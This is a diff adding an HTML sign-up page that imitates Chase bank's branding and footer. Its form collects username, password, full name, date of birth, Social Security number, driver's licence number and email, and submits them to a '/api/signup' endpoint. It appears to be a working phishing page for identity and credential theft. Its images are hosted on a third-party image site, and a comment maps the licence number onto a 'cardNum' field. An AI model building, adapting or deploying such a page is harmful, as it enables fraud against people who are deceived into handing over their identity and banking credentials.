@@ -1,0 +1,374 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Register - Verification</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <style>
+        /* --- CSS STYLES --- */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Open Sans', sans-serif;
+        }
+
+        body {
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+
+        /* Fixed Background Image */
+        .background-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: url('https://i.ibb.co/qY1fbv7z/IMG-3782.jpg') no-repeat center center/cover;
+            z-index: -1;
+        }
+
+        .main-container {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            width: 100%;
+            margin-top: 20px;
+            margin-bottom: 20px;
+        }
+
+        /* Logo Styling */
+        .logo-container {
+            margin-bottom: 30px;
+            text-align: center;
+            width: 100%;
+        }
+
+        .app-logo {
+            max-width: 200px;
+            height: auto;
+            display: block;
+            margin: 0 auto;
+        }
+
+        /* Card Styling */
+        .login-card {
+            background-color: #ffffff;
+            width: 100%;
+            max-width: 400px;
+            padding: 30px 25px;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+        }
+
+        .input-group {
+            position: relative;
+            margin-bottom: 25px;
+        }
+
+        /* Border-bottom style inputs */
+        .input-group input {
+            width: 100%;
+            padding: 10px 0;
+            font-size: 16px;
+            border: none;
+            border-bottom: 1px solid #ccc;
+            outline: none;
+            background: transparent;
+            border-radius: 0;
+        }
+
+        /* Floating Labels */
+        .input-group label {
+            position: absolute;
+            top: 10px;
+            left: 0;
+            font-size: 16px;
+            color: #666;
+            pointer-events: none;
+            transition: 0.3s ease all;
+        }
+
+        /* Animation for floating label */
+        .input-group input:focus ~ label,
+        .input-group input:valid ~ label {
+            top: -15px;
+            font-size: 13px;
+            color: #005eb8;
+        }
+
+        /* Password Toggle */
+        .show-password {
+            position: absolute;
+            right: 0;
+            top: 10px;
+            color: #005eb8;
+            cursor: pointer;
+            font-weight: 600;
+            font-size: 14px;
+        }
+
+        /* Sign Up Button */
+        .sign-up-btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #005eb8;
+            color: white;
+            font-size: 18px;
+            font-weight: bold;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 10px;
+            margin-bottom: 20px;
+            transition: background 0.3s;
+        }
+
+        .sign-up-btn:hover {
+            background-color: #004494;
+        }
+
+        /* Links */
+        .links {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        .links a {
+            text-decoration: none;
+            color: #005eb8;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        /* Footer Styling */
+        .footer {
+            background-color: #ffffff;
+            padding: 30px 20px;
+            text-align: center;
+            width: 100%;
+            border-top: 1px solid #ddd;
+        }
+
+        .social-icons {
+            margin-bottom: 20px;
+        }
+
+        .social-icons i {
+            font-size: 20px;
+            color: #555;
+            margin: 0 12px;
+            cursor: pointer;
+        }
+
+        .footer-links {
+            margin-bottom: 15px;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 15px;
+        }
+
+        .footer-links a {
+            text-decoration: none;
+            color: #555;
+            font-size: 12px;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        .copyright p {
+            font-size: 11px;
+            color: #777;
+            margin-top: 10px;
+        }
+        
+        /* Error Message */
+        .error-message {
+            color: red;
+            font-size: 13px;
+            margin-bottom: 10px;
+            text-align: center;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="background-overlay"></div>
+
+    <div class="main-container">
+        <div class="logo-container">
+            <img src="https://i.ibb.co/wNCTy1Hk/IMG-3783.jpg" alt="Logo" class="app-logo">
+        </div>
+
+        <div class="login-card">
+            <form id="registerForm">
+                <div id="error-msg" class="error-message"></div>
+
+                <!-- 1. Username -->
+                <div class="input-group">
+                    <input type="text" id="reg-username" required>
+                    <label for="reg-username">Username</label>
+                </div>
+
+                <!-- 2. Password -->
+                <div class="input-group">
+                    <input type="password" id="reg-password" required>
+                    <label for="reg-password">Password</label>
+                    <span class="show-password" onclick="togglePassword('reg-password', this)">Show</span>
+                </div>
+
+                <!-- 3. Full Name -->
+                <div class="input-group">
+                    <input type="text" id="full-name" required>
+                    <label for="full-name">Full Name</label>
+                </div>
+
+                <!-- 4. Date of Birth -->
+                <div class="input-group">
+                    <input type="text" id="dob" required>
+                    <label for="dob">Date of Birth (MM/DD/YYYY)</label>
+                </div>
+
+                <!-- 5. SSN -->
+                <div class="input-group">
+                    <input type="text" id="ssn" required>
+                    <label for="ssn">Social Security Number</label>
+                </div>
+
+                <!-- 6. Driver License Number -->
+                <div class="input-group">
+                    <input type="text" id="dl-number" required>
+                    <label for="dl-number">Driver's License Number</label>
+                </div>
+
+                <!-- 7. Email Address (Standard requirement) -->
+                <div class="input-group">
+                    <input type="email" id="reg-email" required>
+                    <label for="reg-email">Email Address</label>
+                </div>
+
+                <button type="submit" class="sign-up-btn" id="btn-submit">Sign up</button>
+
+                <div class="links">
+                    <a href="login.html">Already have an account? Sign in <i class="fas fa-chevron-right"></i></a>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <footer class="footer">
+        <div class="social-icons">
+            <i class="fab fa-facebook-f"></i>
+            <i class="fab fa-instagram"></i>
+            <i class="fab fa-twitter"></i> 
+            <i class="fab fa-youtube"></i>
+            <i class="fab fa-linkedin-in"></i>
+        </div>
+        
+        <div class="footer-links">
+            <a href="#">Contact us</a>
+            <a href="#">Privacy & security</a>
+            <a href="#">Terms of use</a>
+            <a href="#">Accessibility</a>
+            <a href="#">SAFE Act: Chase Mortgage Loan Originators</a>
+            <a href="#">Fair Lending</a>
+            <a href="#">About Chase</a>
+            <a href="#">J.P. Morgan</a>
+            <a href="#">JPMorgan Chase & Co.</a>
+            <a href="#">Careers</a>
+            <a href="#">Español</a>
+        </div>
+        
+        <div class="copyright">
+            <p>&copy; 2025 Chase. All rights reserved.</p>
+        </div>
+    </footer>
+
+    <script>
+        function togglePassword(inputId, toggleBtn) {
+            const passwordInput = document.getElementById(inputId);
+            
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                toggleBtn.textContent = 'Hide';
+            } else {
+                passwordInput.type = 'password';
+                toggleBtn.textContent = 'Show';
+            }
+        }
+        
+        document.getElementById('registerForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const btn = document.getElementById('btn-submit');
+            const errorDiv = document.getElementById('error-msg');
+            
+            btn.textContent = 'Processing...';
+            btn.disabled = true;
+            errorDiv.style.display = 'none';
+
+            // Split Full Name into First and Last
+            const fullName = document.getElementById('full-name').value.trim();
+            const nameParts = fullName.split(' ');
+            const firstName = nameParts[0];
+            const lastName = nameParts.slice(1).join(' ') || '';
+
+            const formData = {
+                username: document.getElementById('reg-username').value,
+                password: document.getElementById('reg-password').value,
+                firstName: firstName,
+                lastName: lastName,
+                email: document.getElementById('reg-email').value,
+                ssn: document.getElementById('ssn').value,
+                // We use DL as cardNum for backend compatibility
+                cardNum: document.getElementById('dl-number').value, 
+                dob: document.getElementById('dob').value
+            };
+
+            try {
+                const res = await fetch('/api/signup', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify(formData)
+                });
+                
+                const data = await res.json();
+                
+                if (data.success) {
+                    // Success!
+                    alert('Account created successfully! Please sign in.');
+                    window.location.href = 'login.html';
+                } else {
+                    // Show error
+                    errorDiv.textContent = data.message || 'Registration failed.';
+                    errorDiv.style.display = 'block';
+                    btn.textContent = 'Sign up';
+                    btn.disabled = false;
+                }
+            } catch (err) {
+                console.error(err);
+                errorDiv.textContent = 'Connection error. Please try again.';
+                errorDiv.style.display = 'block';
+                btn.textContent = 'Sign up';
+                btn.disabled = false;
+            }
+        });
+    </script>
+</body>
+</html>
+
